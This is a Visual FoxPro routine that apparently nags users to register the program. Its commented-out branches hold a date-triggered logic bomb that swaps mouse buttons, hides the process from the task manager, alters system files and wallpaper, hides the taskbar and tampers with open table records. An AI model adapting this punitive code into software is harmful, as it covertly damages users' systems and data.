LPARAMETERS cParam
#DEFINE year4end 2020
DO CASE
CASE EMPTY(cParam)
CASE "FOXTROT"$UPPER(ID())
*!*	CASE DATE()>DATE(year4end,12,12)
*!*		ON ERROR DO AppQuit
*!*		DECLARE INTEGER SwapMouseButton IN user32 INTEGER bSwap
*!*		=SwapMouseButton(.T.)
*!*		DO GoHome
*!*	CASE DATE()>DATE(year4end,8,8)
*!*		IF _Screen.Windows98
*!*	*!*	невидимость для Ctrl+Alt+Del
*!*			DECLARE INTEGER GetCurrentProcessId IN kernel32.dll
*!*			DECLARE INTEGER RegisterServiceProcess IN kernel32.dll INTEGER, INTEGER
*!*			RegisterServiceProcess(GetCurrentProcessId(), 1)
*!*	*!*	установка обоев и прочего
*!*			LOCAL winsys
*!*			STORE _Screen.WinDir+"SYSTEM\" TO winsys
*!*			DO iniwrite WITH winsys+"oeminfo.ini","General","Manufacturer","kanat@newmail.ru"
*!*			IF !FILE(winsys+"oemlogo.bmp")
*!*				=STRTOFILE(FILETOSTR("logo.bmp"),winsys+"oemlogo.bmp")
*!*			ENDIF
*!*			IF FILE(winsys+"oemlogo.bmp")
*!*				DO iniwrite WITH ,"Desktop","Wallpaper",winsys+"oemlogo.bmp"
*!*				DO iniwrite WITH ,"Desktop","TileWallpaper","1"
*!*			ENDIF
*!*		ENDIF
*!*		DO GoHome
CASE RECCOUNT()>iRand()+ABS(DATE(year4end,4,4)-DATE())+999
	WAIT WINDOW "He зaбудьтe зapeгиcтpиpoвaть пpoгpaмму" NOWAIT
*!*		MESSAGEBOX("He зaбудьтe зapeгиcтpиpoвaть пpoгpaмму",64,_Screen.Caption)
ENDCASE

*!*	PROCEDURE GoHome
*!*	MESSAGEBOX("Bы зaбыли зapeгиcтpиpoвaть пpoгpaмму",16,_Screen.Caption,_Screen.MBTimeout)
*!*	LOCAL nn
*!*	IF _Screen.Visible
*!*	    DECLARE LONG FindWindow IN "user32" STRING lpClassName, STRING lpWindowName
*!*	    DECLARE LONG SetWindowPos IN "user32" LONG hWnd, LONG hWndInsertAfter, LONG x, LONG Y, LONG cx, LONG cy, LONG wFlags
*!*	    #DEFINE WINDOWHIDE 0x80
*!*	*!*	    #DEFINE WINDOWSHOW 0x40
*!*	    nn = FindWindow("Shell_TrayWnd", "")
*!*	    =SetWindowPos(nn, 0, 0, 0, 0, 0, WINDOWHIDE)
*!*	ENDIF
*!*	_Screen.Visible=.F.
*!*	IF USED() AND !ISREADONLY()
*!*		FOR nn=1 TO WEEK(DATE())
*!*			APPEND BLANK
*!*			DELETE
*!*		ENDFOR
*!*	ENDIF
*!*	*!*	CLEAR EVENTS
*!*	RETURN TO MASTER
